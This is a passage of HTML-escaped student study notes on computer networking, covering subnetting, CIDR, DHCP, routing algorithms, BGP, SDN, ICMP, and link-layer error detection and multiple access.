        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;&amp;ldquo;Network mask&amp;rdquo;&lt;/li&gt;
&lt;li&gt;set of interfaces that can physically reach each other without passing through an intervening router&lt;/li&gt;
&lt;li&gt;IP addresses have structure
&lt;ul&gt;
&lt;li&gt;subnet part&lt;/li&gt;
&lt;li&gt;host part&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;detach each interface from its host or router, creating islands of isolated networks&lt;/li&gt;
&lt;li&gt;each isolated network is called a subnet
&lt;ul&gt;
&lt;li&gt;subnet mask: /24 (high-order 24 bits: subnet part of the IP address)&lt;/li&gt;
&lt;li&gt;even links connecting two routers is a subnet&lt;/li&gt;
&lt;li&gt;one way is to hide the routers and see the link groups&lt;/li&gt;
&lt;li&gt;another way is to take the unique 24-bit high-order IP addresses&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Consider a router that interconnects three subnets: Subnet 1, Subnet 2, and
Subnet 3. Suppose all of the interfaces in each of these three subnets are
required to have the prefix 223.1.17.0/24. Also suppose that Subnet 1 is
required to support at least 60 interfaces, Subnet 2 is to support at least 90
interfaces, and Subnet 3 is to support at least 12 interfaces. Which three
network addresses (of the form a.b.c.d/x) satisfy these constraints?&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Subnet1: 223.1.17.0/26,&lt;/li&gt;
&lt;li&gt;Subnet2: 223.1.17.128/25,&lt;/li&gt;
&lt;li&gt;Subnet3: 223.1.17.64/28&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;classless-interdomain-routing&#34; &gt;Classless Interdomain Routing
&lt;span&gt;
    &lt;a href=&#34;#classless-interdomain-routing&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;Cider / CIDR&lt;/li&gt;
&lt;li&gt;Can get something like 200.23.16.0/23&lt;/li&gt;
&lt;li&gt;System admin sets IP addresses of each host&lt;/li&gt;
&lt;li&gt;DHCP: Dynamic Host Configuration Protocol
&lt;ul&gt;
&lt;li&gt;plug-and-play to set IP addresses&lt;/li&gt;
&lt;li&gt;can renew addresses&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;dhcp&#34; &gt;DHCP
&lt;span&gt;
    &lt;a href=&#34;#dhcp&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;host broadcasts DHCP discover msg (optional)&lt;/li&gt;
&lt;li&gt;DHCP server responds with DHCP offer msg (optional)&lt;/li&gt;
&lt;li&gt;host requests IP address: DHCP request msg
&lt;ul&gt;
&lt;li&gt;broadcast IP&lt;/li&gt;
&lt;li&gt;everyone in the network receives the message, but only server is configured to respond to the message&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;DHCP server sends address: DHCP ack msg
&lt;ul&gt;
&lt;li&gt;Contains IP, subnet mask, DNS server IP, default gateway&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Steps
&lt;ul&gt;
&lt;li&gt;broadcast IP&lt;/li&gt;
&lt;li&gt;DHCP server offers an IP address&lt;/li&gt;
&lt;li&gt;Client tells DHCP server that it wants to use that IP address&lt;/li&gt;
&lt;li&gt;DHCP acknowledges&lt;/li&gt;
&lt;li&gt;IP has lifetime&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;generalized-forwarding&#34; &gt;Generalized Forwarding
&lt;span&gt;
    &lt;a href=&#34;#generalized-forwarding&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;subheader matching,&lt;/li&gt;
&lt;li&gt;action: forwarding/drop/modify&lt;/li&gt;
&lt;li&gt;flow table abstraction
&lt;ul&gt;
&lt;li&gt;priority&lt;/li&gt;
&lt;li&gt;counters&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;routing-algorithms&#34; &gt;Routing Algorithms
&lt;span&gt;
    &lt;a href=&#34;#routing-algorithms&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;Link-State Routing Protocol
&lt;ul&gt;
&lt;li&gt;global knowledge about the network&lt;/li&gt;
&lt;li&gt;Dijkstra&amp;rsquo;s algorithm&lt;/li&gt;
&lt;li&gt;Least-cost path from one node to all other nodes&lt;/li&gt;
&lt;li&gt;For k iterations, there are k nodes with known least-cost paths&lt;/li&gt;
&lt;li&gt;O(n^2) runtime complexity&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Bellman-Ford&lt;/li&gt;
&lt;li&gt;Distance-vector
&lt;ul&gt;
&lt;li&gt;wait, recompute (start at 1 for adjacent nodes), notify (current internal mapping)
&lt;ul&gt;
&lt;li&gt;Convergence: two furthest nodes (t = largest number of hops)&lt;/li&gt;
&lt;li&gt;Link cost changes
&lt;ul&gt;
&lt;li&gt;recalculate local DV, notify neighbours&lt;/li&gt;
&lt;li&gt;bad news travels slow&lt;/li&gt;
&lt;li&gt;if there is an update that makes a link really bad, the nodes will keep relaying information to another updating by 1 each time till it&amp;rsquo;s done&lt;/li&gt;
&lt;li&gt;to avoid this, we can use &amp;ldquo;poisoned reverse&amp;rdquo; and &amp;ldquo;split horizon&amp;rdquo;&lt;/li&gt;
&lt;li&gt;&lt;em&gt;poisoned reverse&lt;/em&gt;: accept higher value (error message)&lt;/li&gt;
&lt;li&gt;&lt;em&gt;split horizon&lt;/em&gt;: if the predecessor sends an update, don&amp;rsquo;t send back an update. Let timeout expiry fix the cost&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Example of DV.  C - A  - B. In first iteration, we figure out the distance and we notify. C and B update their mappings, so notify a second time, and be done.&lt;/p&gt;
&lt;h3 id=&#34;routing-scaling&#34; &gt;Routing Scaling
&lt;span&gt;
    &lt;a href=&#34;#routing-scaling&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;administration Autonomous System routing&lt;/li&gt;
&lt;li&gt;Tier-1 ISPs either have one or multiple&lt;/li&gt;
&lt;li&gt;AS numbers assigned by ICANN&lt;/li&gt;
&lt;li&gt;intra-AS routing&lt;/li&gt;
&lt;li&gt;RIP: Routing INformation Protocol (RFC 1723)
&lt;ul&gt;
&lt;li&gt;Classic DV&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;EIGRP: Enhanced Interior Gateway Routing Protocol
&lt;ul&gt;
&lt;li&gt;Cisco-proprietary for decades (2013 open, RFC 7868)&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;OSPF: Open Shortest Path First (RFC 2328)&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;ebgp-ibgp&#34; &gt;eBGP, iBGP
&lt;span&gt;
    &lt;a href=&#34;#ebgp-ibgp&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;Route between AS (inter-AS routing protocol)&lt;/li&gt;
&lt;li&gt;Advertise that a subnet exist to all routers&lt;/li&gt;
&lt;li&gt;Determine best route to a &lt;em&gt;prefix&lt;/em&gt; (e.g. 138.16.68/22)&lt;/li&gt;
&lt;li&gt;All ASs run BGP for inter-AS routing&lt;/li&gt;
&lt;li&gt;External Border Gateway Protocol (two ASs)&lt;/li&gt;
&lt;li&gt;Internal Border Gateway Protocol (one AS)&lt;/li&gt;
&lt;li&gt;BGP session
&lt;ul&gt;
&lt;li&gt;semi-permanent TCP connection&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;AS-PATH: list of ASes prefix has passed&lt;/li&gt;
&lt;li&gt;NEXT-HOP: internal-AS router to next-hop AS&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;software-defined-networking&#34; &gt;Software Defined Networking
&lt;span&gt;
    &lt;a href=&#34;#software-defined-networking&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;Why a logically centralized control plane?&lt;/li&gt;
&lt;li&gt;table-forwarding to routers&lt;/li&gt;
&lt;li&gt;OpenFlow: table-based switch control
&lt;ul&gt;
&lt;li&gt;Many header field to match&lt;/li&gt;
&lt;li&gt;VLAN: Virtual LAN&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;SDN Controller: state management, communications&lt;/li&gt;
&lt;li&gt;&lt;em&gt;packet-in&lt;/em&gt;: transfer packet to controller&lt;/li&gt;
&lt;li&gt;&lt;em&gt;flow-removed&lt;/em&gt;: flow table entry deleted at Switch&lt;/li&gt;
&lt;li&gt;&lt;em&gt;port-status&lt;/em&gt;: inform controller of a change on a port&lt;/li&gt;
&lt;li&gt;&lt;em&gt;modify-state&lt;/em&gt;: modify entries in switch flow table&lt;/li&gt;
&lt;li&gt;&lt;em&gt;read-state&lt;/em&gt;: stats&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;icmp-internet-control-message-protocol&#34; &gt;ICMP: Internet Control Message Protocol
&lt;span&gt;
    &lt;a href=&#34;#icmp-internet-control-message-protocol&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;RFC 792&lt;/li&gt;
&lt;li&gt;network level information&lt;/li&gt;
&lt;li&gt;hosts and routers&lt;/li&gt;
&lt;li&gt;unreachable (1) host, (2) network, (3) port, (4) protocol&lt;/li&gt;
&lt;li&gt;echo request/reply (ping)&lt;/li&gt;
&lt;li&gt;typically used for errors&lt;/li&gt;
&lt;/ul&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-icmp&#34; data-lang=&#34;icmp&#34;&gt;Echo reply (to ping), type 0, code 0
Destination network unreachable, type 3 code 0
Destination host unreachable, type 3, code 1.
Source quench (congestion control), type 4 code 0.
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;chapter-6-data-link-layer&#34; &gt;Chapter 6 Data Link Layer
&lt;span&gt;
    &lt;a href=&#34;#chapter-6-data-link-layer&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h2&gt;&lt;p&gt;Multiple access protocols and LAN&amp;rsquo;s, address resolution protocol, Ethernet.&lt;/p&gt;
&lt;h3 id=&#34;where-is-it-implemented&#34; &gt;Where is it Implemented
&lt;span&gt;
    &lt;a href=&#34;#where-is-it-implemented&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;on every host&lt;/li&gt;
&lt;li&gt;inside network interface cards (NICs) or a chip, attached to systems buses&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;link-layer-protocol&#34; &gt;Link-Layer Protocol
&lt;span&gt;
    &lt;a href=&#34;#link-layer-protocol&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;Layer 2&lt;/li&gt;
&lt;li&gt;A node is a device running such protocols&lt;/li&gt;
&lt;li&gt;Examples of nodes: hosts, routers, switches, and WiFi access points&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;what-is-a-link&#34; &gt;What is a Link?
&lt;span&gt;
    &lt;a href=&#34;#what-is-a-link&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;p&gt;The communication channels that connect adjacent nodes along the communication path&lt;/p&gt;
&lt;h3 id=&#34;link-layer-frame&#34; &gt;Link Layer Frame
&lt;span&gt;
    &lt;a href=&#34;#link-layer-frame&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;p&gt;Transmitting nodes encapsulate datagrams in a &lt;em&gt;link-layer frame&lt;/em&gt;. These frames are transmitted into links.
The datagram is a person in a transportation vehicle (e.g. train), and the links are the rails.&lt;/p&gt;
&lt;h3 id=&#34;error-detection-via-parity-checks&#34; &gt;Error Detection via Parity Checks
&lt;span&gt;
    &lt;a href=&#34;#error-detection-via-parity-checks&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;Single bit parity: even number of 1s
&lt;ul&gt;
&lt;li&gt;Fails to catch even number of bit errors&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Two-dimensional bit parity
&lt;ul&gt;
&lt;li&gt;Divide total bits in data into i rows and j columns&lt;/li&gt;
&lt;li&gt;Parity bit on the row and column&lt;/li&gt;
&lt;li&gt;Detect and correct single bit errors on the row and column&lt;/li&gt;
&lt;li&gt;if a bit is flipped, both the row and column parities will report an error, in a coordinate form&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;error-detection-via-checksum&#34; &gt;Error Detection via Checksum
&lt;span&gt;
    &lt;a href=&#34;#error-detection-via-checksum&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;total bits are a sequence of k-bit integers&lt;/li&gt;
&lt;li&gt;sum the integers for the error-detection bits&lt;/li&gt;
&lt;li&gt;internet checksum: 16-bit integers&lt;/li&gt;
&lt;li&gt;check: take 1s complement of the sum of data including checksum and expect 0&lt;/li&gt;
&lt;li&gt;TCP &amp;amp; UDP: one checksum for entire packet&lt;/li&gt;
&lt;li&gt;IP: checksum for header&lt;/li&gt;
&lt;li&gt;Transport layer is software based so we want it to be quick&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;cyclic-redundancy-check-crc&#34; &gt;Cyclic Redundancy Check (CRC)
&lt;span&gt;
    &lt;a href=&#34;#cyclic-redundancy-check-crc&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;Sender and receiver agree on r + 1 bit pattern (generator) that should be able to divide the data bits plus r additional bits (binary division)&lt;/li&gt;
&lt;li&gt;bit pattern: DR (d + r bits)&lt;/li&gt;
&lt;li&gt;R = remainder (D * 2^r / G)&lt;/li&gt;
&lt;li&gt;Error detection guaranteed for fewer than r + 1 bit errors&lt;/li&gt;
&lt;li&gt;link-layer&lt;/li&gt;
&lt;li&gt;dedicated hardware&lt;/li&gt;
&lt;li&gt;CRC codes or polynomial codes&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;multiple-access-protocols&#34; &gt;Multiple Access Protocols
&lt;span&gt;
    &lt;a href=&#34;#multiple-access-protocols&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;p&gt;There are point-to-point links (single sender, single receiver) and broadcast links (multiple sending and receiving nodes all connected to a single shared broadcast channel implying that every node gets every broadcast).&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;point-to-point links
&lt;ul&gt;
&lt;li&gt;point-to-point protocol (PPP)&lt;/li&gt;
&lt;li&gt;high-level data link control (HDLC)&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;broadcast links
&lt;ul&gt;
&lt;li&gt;when any one node transmits a frame, the channel broadcasts the frame and each of the other nodes receives a copy&lt;/li&gt;
&lt;li&gt;Ethernet or WiFi (wireless LAN), 4G/5G&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;multiple access problem&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;collision: a node can&amp;rsquo;t make the two or more tangled frames it received due to two or more nodes transmitting simultaneously
&lt;ul&gt;
&lt;li&gt;data loss, wasted broadcast bandwidth&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;four decades of academic research on multiple access protocols have been done&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;more info
&lt;ul&gt;
&lt;li&gt;distributed algorithm&lt;/li&gt;
&lt;li&gt;channel sharing info is shared on the channel itself&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Three Categories of multiple access protocols&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;channel partitioning protocols&lt;/li&gt;
&lt;li&gt;random access protocols&lt;/li&gt;
&lt;li&gt;taking-turns protocols&lt;/li&gt;
&lt;/ul&gt;
